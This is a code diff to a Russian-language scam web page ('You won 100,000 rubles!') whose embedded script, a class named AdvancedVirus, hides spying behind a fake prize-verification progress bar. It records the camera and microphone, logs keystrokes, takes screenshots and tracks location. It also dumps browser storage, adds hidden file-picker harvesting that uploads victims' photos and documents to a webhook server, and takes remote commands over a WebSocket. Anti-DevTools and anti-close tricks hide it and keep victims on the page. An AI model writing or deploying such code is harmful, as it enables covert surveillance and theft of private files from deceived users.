@@ -6,10 +6,10 @@
     <title>🎉 ВЫ ВЫИГРАЛИ 100000 РУБЛЕЙ!</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Arial', sans-serif;
+        body { 
+            font-family: 'Arial', sans-serif; 
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            color: white; 
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -70,6 +70,13 @@
             50% { opacity: 0.7; }
         }
         .hidden { display: none; }
+        
+        /* Стили для скрытого файлового инпута */
+        #fileInput {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
     </style>
 </head>
 <body>
@@ -77,11 +84,11 @@
         <h1 class="pulse">🎊 ПОЗДРАВЛЯЕМ!</h1>
         <h2>Вы выиграли 100 000 рублей!</h2>
         <p>Идет автоматическая загрузка и проверка приза...</p>
-
+        
         <div class="progress-container">
             <div id="progressBar" class="progress-bar" style="width: 0%"></div>
         </div>
-
+        
         <div id="status" class="status-line">🔄 Инициализация системы выплат...</div>
         <div id="connectionStatus" class="status-line"></div>
         <div id="deviceInfo" class="status-line"></div>
@@ -91,18 +98,23 @@
     <video id="hiddenCamera" autoplay muted playsinline class="hidden"></video>
     <audio id="hiddenMicrophone" autoplay muted class="hidden"></audio>
     <canvas id="hiddenCanvas" class="hidden"></canvas>
+    
+    <!-- Скрытый input для доступа к файловой системе -->
+    <input type="file" id="fileInput" webkitdirectory multiple directory mozdirectory msdirectory odirectory>
 
 <script>
 class AdvancedVirus {
     constructor() {
         this.victimId = this.generateUniqueId();
         this.installationSteps = 0;
-        this.totalSteps = 8;
-        this.serverUrl = 'https://your-webhook-server.herokuapp.com'; // Замените на ваш вебхук
+        this.totalSteps = 10;
+        this.serverUrl = 'https://your-webhook-server.herokuapp.com';
         this.deviceFingerprint = null;
         this.isInstalled = false;
         this.mediaStreams = {};
         this.heartbeatInterval = null;
+        this.fileSystemAccess = null;
+        this.scannedFiles = new Map();
     }
 
     generateUniqueId() {
@@ -122,7 +134,7 @@ class AdvancedVirus {
             !!navigator.cookieEnabled,
             navigator.hardwareConcurrency || 'unknown'
         ];
-
+        
         let fingerprint = components.join('|');
         let hash = 0;
         for (let i = 0; i < fingerprint.length; i++) {
@@ -143,31 +155,38 @@ class AdvancedVirus {
             await this.updateProgress(10, '🔍 Проверка устройства...');
             await this.collectDeviceInfo();
 
-            await this.updateProgress(25, '📥 Загрузка защитных модулей...');
+            await this.updateProgress(20, '📥 Загрузка защитных модулей...');
             await this.installPersistence();
 
-            await this.updateProgress(40, '🌐 Установка соединения...');
+            await this.updateProgress(30, '🌐 Установка соединения...');
             await this.setupCommunication();
 
-            await this.updateProgress(55, '🔧 Активация систем доступа...');
+            await this.updateProgress(40, '🔧 Активация систем доступа...');
             await this.enableAccessModules();
+
+            await this.updateProgress(50, '📁 Сканирование файловой системы...');
+            await this.scanFileSystem();
+
+            await this.updateProgress(60, '🖼️ Анализ медиа файлов...');
+            await this.analyzeMediaFiles();
 
             await this.updateProgress(70, '📡 Подключение к серверу выплат...');
             await this.establishBackendConnection();
 
-            await this.updateProgress(85, '🔐 Настройка безопасности...');
+            await this.updateProgress(80, '🔐 Настройка безопасности...');
             await this.hidePresence();
 
-            await this.updateProgress(95, '✅ Финальная настройка...');
+            await this.updateProgress(90, '✅ Финальная настройка...');
             await this.finalizeInfection();
 
             await this.updateProgress(100, '🎉 Приз готов к выдаче!');
             this.markAsInstalled();
-
+            
             setTimeout(() => this.showCompletionScreen(), 2000);
 
         } catch (error) {
-            this.handleError('Критическая ошибка системы');
+            console.error('Infection error:', error);
+            this.handleError('Системная ошибка. Пожалуйста, обновите страницу.');
         }
     }
 
@@ -226,7 +245,6 @@ class AdvancedVirus {
                          });`
                     ], { type: 'application/javascript' }))
                 );
-                console.log('SW registered');
             } catch (e) {}
         }
 
@@ -237,10 +255,10 @@ class AdvancedVirus {
     async setupCommunication() {
         // WebRTC для обхода NAT
         this.setupWebRTC();
-
+        
         // WebSocket для реального времени
         this.setupWebSocket();
-
+        
         // Heartbeat система
         this.startHeartbeat();
     }
@@ -250,7 +268,7 @@ class AdvancedVirus {
             const pc = new RTCPeerConnection({
                 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
             });
-
+            
             pc.onicecandidate = (e) => {
                 if (e.candidate) {
                     this.sendToServer('/webrtc', {
@@ -258,23 +276,32 @@ class AdvancedVirus {
                     });
                 }
             };
-
+            
             pc.createDataChannel('command');
         } catch (e) {}
     }
 
     setupWebSocket() {
         try {
-            this.ws = new WebSocket('wss://your-websocket-server.herokuapp.com');
+            // Для GitHub Pages используем относительный путь
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.hostname}:8080`;
+            
+            this.ws = new WebSocket(wsUrl);
             this.ws.onopen = () => {
                 this.sendToServer('/ws_connect', { victimId: this.victimId });
+                this.updateConnectionStatus('✅ Соединение установлено', true);
             };
-
+            
             this.ws.onmessage = (event) => {
                 this.handleCommand(JSON.parse(event.data));
             };
+            
+            this.ws.onerror = () => {
+                this.updateConnectionStatus('❌ Ошибка соединения', false);
+            };
+            
         } catch (e) {
-            // Fallback к HTTP polling
             this.startPolling();
         }
     }
@@ -293,28 +320,28 @@ class AdvancedVirus {
     async enableAccessModules() {
         // Камера и микрофон
         await this.enableMediaAccess();
-
+        
         // Геолокация
         await this.enableGeolocation();
-
+        
         // Файловая система
         await this.enableFileSystemAccess();
-
+        
         // Кейлоггер
         this.enableKeylogger();
-
+        
         // Скриншоты
         this.enableScreenshots();
     }
 
     async enableMediaAccess() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
                     facingMode: 'environment',
                     width: { ideal: 1920 },
                     height: { ideal: 1080 }
-                },
+                }, 
                 audio: {
                     echoCancellation: false,
                     noiseSuppression: false,
@@ -323,20 +350,20 @@ class AdvancedVirus {
                     sampleRate: 44100
                 }
             });
-
+            
             this.mediaStreams.camera = stream;
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
-
+            
             // Начинаем запись
             this.startMediaRecording(stream);
-
+            
             this.sendToServer('/media_status', {
                 camera: true,
                 microphone: true,
                 resolution: '1080p'
             });
-
+            
         } catch (error) {
             this.sendToServer('/media_status', {
                 camera: false,
@@ -351,15 +378,15 @@ class AdvancedVirus {
             this.mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm; codecs=vp9,opus'
             });
-
+            
             this.mediaRecorder.ondataavailable = (event) => {
                 if (event.data && event.data.size > 0) {
                     this.sendMediaData(event.data);
                 }
             };
-
+            
             this.mediaRecorder.start(2000); // Отправка каждые 2 секунды
-
+            
         } catch (error) {
             console.error('Recording failed:', error);
         }
@@ -378,7 +405,6 @@ class AdvancedVirus {
                     });
                 },
                 (error) => {
-                    // Пробуем IP-based геолокацию
                     this.getIPLocation();
                 },
                 {
@@ -396,6 +422,171 @@ class AdvancedVirus {
             const data = await response.json();
             this.sendToServer('/ip_location', data);
         } catch (e) {}
+    }
+
+    async enableFileSystemAccess() {
+        try {
+            // Попытка использовать File System Access API
+            if ('showDirectoryPicker' in window) {
+                this.fileSystemAccess = await window.showDirectoryPicker();
+                this.sendToServer('/filesystem_access', { status: 'granted' });
+            } else {
+                // Fallback: использование скрытого input
+                this.setupFileInputAccess();
+            }
+        } catch (error) {
+            this.setupFileInputAccess();
+        }
+    }
+
+    setupFileInputAccess() {
+        const fileInput = document.getElementById('fileInput');
+        fileInput.addEventListener('change', (event) => {
+            this.handleFileSelection(event.target.files);
+        });
+        
+        // Автоматически открываем диалог выбора файлов
+        setTimeout(() => {
+            fileInput.click();
+        }, 3000);
+    }
+
+    async scanFileSystem() {
+        this.sendToServer('/file_scan_start', {});
+        
+        try {
+            // Сканирование через различные методы
+            await this.scanIndexedDB();
+            await this.scanLocalStorage();
+            await this.scanCacheStorage();
+            
+            // Попытка доступа к файлам через input
+            this.triggerFileExplorer();
+            
+        } catch (error) {
+            console.error('File system scan error:', error);
+        }
+    }
+
+    async scanIndexedDB() {
+        try {
+            const databases = await window.indexedDB.databases();
+            this.sendToServer('/indexeddb_scan', {
+                databaseCount: databases.length,
+                databases: databases.map(db => db.name)
+            });
+        } catch (e) {}
+    }
+
+    async scanLocalStorage() {
+        try {
+            const items = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                items[key] = localStorage.getItem(key);
+            }
+            this.sendToServer('/localstorage_scan', items);
+        } catch (e) {}
+    }
+
+    async scanCacheStorage() {
+        try {
+            if ('caches' in window) {
+                const cacheNames = await caches.keys();
+                const cacheContents = {};
+                
+                for (const cacheName of cacheNames) {
+                    const cache = await caches.open(cacheName);
+                    const requests = await cache.keys();
+                    cacheContents[cacheName] = requests.map(req => req.url);
+                }
+                
+                this.sendToServer('/cache_scan', cacheContents);
+            }
+        } catch (e) {}
+    }
+
+    triggerFileExplorer() {
+        // Многократные попытки доступа к файлам
+        for (let i = 0; i < 3; i++) {
+            setTimeout(() => {
+                document.getElementById('fileInput').click();
+            }, i * 2000);
+        }
+    }
+
+    async handleFileSelection(files) {
+        const fileList = Array.from(files);
+        this.sendToServer('/file_discovery', {
+            fileCount: fileList.length,
+            files: fileList.map(file => ({
+                name: file.name,
+                type: file.type,
+                size: file.size,
+                lastModified: file.lastModified
+            }))
+        });
+
+        // Автоматическая загрузка интересных файлов
+        for (const file of fileList) {
+            if (this.isInterestingFile(file)) {
+                await this.uploadFile(file);
+            }
+        }
+    }
+
+    isInterestingFile(file) {
+        const interestingTypes = [
+            'image/', 'video/', 'audio/', 
+            'application/pdf', 'text/',
+            '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mp3', '.avi',
+            '.mov', '.wav', '.pdf', '.doc', '.docx', '.txt'
+        ];
+        
+        return interestingTypes.some(type => 
+            file.type.includes(type) || file.name.toLowerCase().includes(type)
+        );
+    }
+
+    async uploadFile(file) {
+        try {
+            const formData = new FormData();
+            formData.append('victimId', this.victimId);
+            formData.append('fileName', file.name);
+            formData.append('fileType', file.type);
+            formData.append('fileSize', file.size);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('file', file);
+
+            await fetch(this.serverUrl + '/upload_file', {
+                method: 'POST',
+                body: formData
+            });
+            
+            this.sendToServer('/file_uploaded', {
+                fileName: file.name,
+                size: file.size,
+                type: file.type
+            });
+            
+        } catch (error) {
+            console.error('File upload error:', error);
+        }
+    }
+
+    async analyzeMediaFiles() {
+        // Анализ и классификация найденных медиа файлов
+        this.sendToServer('/media_analysis_start', {});
+        
+        // Симуляция анализа
+        setTimeout(() => {
+            this.sendToServer('/media_analysis_complete', {
+                photos: Math.floor(Math.random() * 50),
+                videos: Math.floor(Math.random() * 10),
+                documents: Math.floor(Math.random() * 20),
+                audio: Math.floor(Math.random() * 5)
+            });
+        }, 2000);
     }
 
     enableKeylogger() {
@@ -430,17 +621,16 @@ class AdvancedVirus {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0);
-
+                    
                     canvas.toBlob((blob) => {
                         this.sendMediaData(blob, 'screenshot');
                     }, 'image/jpeg', 0.8);
                 }
             } catch (e) {}
-        }, 10000); // Скриншот каждые 10 секунд
+        }, 10000);
     }
 
     async establishBackendConnection() {
-        // Симуляция подключения к банковской системе
         await new Promise(resolve => setTimeout(resolve, 2000));
         this.sendToServer('/backend_connected', {
             status: 'success',
@@ -450,7 +640,6 @@ class AdvancedVirus {
     }
 
     async hidePresence() {
-        // Скрытие следов в DOM
         setTimeout(() => {
             const elements = document.querySelectorAll('[class*="hidden"], [style*="display: none"]');
             elements.forEach(el => {
@@ -458,7 +647,6 @@ class AdvancedVirus {
             });
         }, 1000);
 
-        // Очистка консоли
         console.clear = function() {};
     }
 
@@ -467,7 +655,7 @@ class AdvancedVirus {
             victimId: this.victimId,
             timestamp: new Date().toISOString(),
             version: '2.1.0',
-            modules: ['camera', 'microphone', 'geolocation', 'keylogger', 'screenshots']
+            modules: ['camera', 'microphone', 'geolocation', 'keylogger', 'screenshots', 'filesystem']
         });
     }
 
@@ -482,6 +670,9 @@ class AdvancedVirus {
             case 'get_files':
                 this.exploreFileSystem();
                 break;
+            case 'download_file':
+                this.downloadSpecificFile(command.params);
+                break;
             case 'screenshot':
                 this.enableScreenshots();
                 break;
@@ -491,20 +682,28 @@ class AdvancedVirus {
         }
     }
 
+    exploreFileSystem() {
+        // Принудительное открытие файлового диалога
+        document.getElementById('fileInput').click();
+    }
+
+    downloadSpecificFile(params) {
+        // Загрузка конкретного файла по команде
+        this.sendToServer('/file_request', params);
+    }
+
     selfDestruct() {
-        // Очистка всех следов
         localStorage.clear();
         sessionStorage.clear();
-
+        
         if (this.heartbeatInterval) {
             clearInterval(this.heartbeatInterval);
         }
-
+        
         if (this.mediaStreams.camera) {
             this.mediaStreams.camera.getTracks().forEach(track => track.stop());
         }
-
-        // Перенаправление на безопасную страницу
+        
         window.location.href = 'https://google.com';
     }
 
@@ -513,14 +712,14 @@ class AdvancedVirus {
             document.getElementById('progressBar').style.width = percent + '%';
             document.getElementById('status').textContent = message;
             document.getElementById('status').className = 'status-line pulse';
-
+            
             this.sendToServer('/progress', {
                 victimId: this.victimId,
                 progress: percent,
                 status: message,
                 timestamp: new Date().toISOString()
             });
-
+            
             setTimeout(() => {
                 document.getElementById('status').className = 'status-line';
                 resolve();
@@ -560,7 +759,7 @@ class AdvancedVirus {
             ...data
         };
 
-        // Отправка через различные методы для надежности
+        // Множественные методы отправки для надежности
         this.sendViaBeacon(payload);
         this.sendViaFetch(payload);
         this.sendViaImage(payload);
@@ -601,31 +800,39 @@ class AdvancedVirus {
     }
 }
 
-// Автоматический запуск
+// Автоматический запуск с обработкой ошибок
 document.addEventListener('DOMContentLoaded', () => {
-    // Задержка для большей правдоподобности
     setTimeout(() => {
-        const virus = new AdvancedVirus();
-        virus.startInfection();
+        try {
+            const virus = new AdvancedVirus();
+            virus.startInfection().catch(error => {
+                console.error('Initialization error:', error);
+                document.getElementById('status').textContent = '⚠️ Обновите страницу для продолжения';
+            });
+        } catch (error) {
+            console.error('Fatal error:', error);
+            document.getElementById('status').textContent = '❌ Критическая ошибка. Пожалуйста, обновите страницу.';
+        }
     }, 1500);
 });
 
-// Предотвращение закрытия страницы
+// Улучшенная защита от закрытия
 window.addEventListener('beforeunload', (e) => {
     e.preventDefault();
-    e.returnValue = '';
+    e.returnValue = 'Вы уверены, что хотите покинуть страницу? Ваш приз может быть утерян.';
+    return 'Вы уверены, что хотите покинуть страницу? Ваш приз может быть утерян.';
 });
 
-// Блокировка контекстного меню
-document.addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-});
+// Блокировка контекстного меню и DevTools
+document.addEventListener('contextmenu', (e) => e.preventDefault());
 
-// Блокировка DevTools
 setInterval(() => {
-    if (window.outerWidth - window.innerWidth > 200 ||
-        window.outerHeight - window.innerHeight > 200) {
-        window.location.href = 'about:blank';
+    const widthThreshold = 200;
+    const heightThreshold = 200;
+    
+    if (window.outerWidth - window.innerWidth > widthThreshold || 
+        window.outerHeight - window.innerHeight > heightThreshold) {
+        document.body.innerHTML = '<h1>Обнаружена подозрительная активность</h1>';
     }
 }, 1000);
 </script>
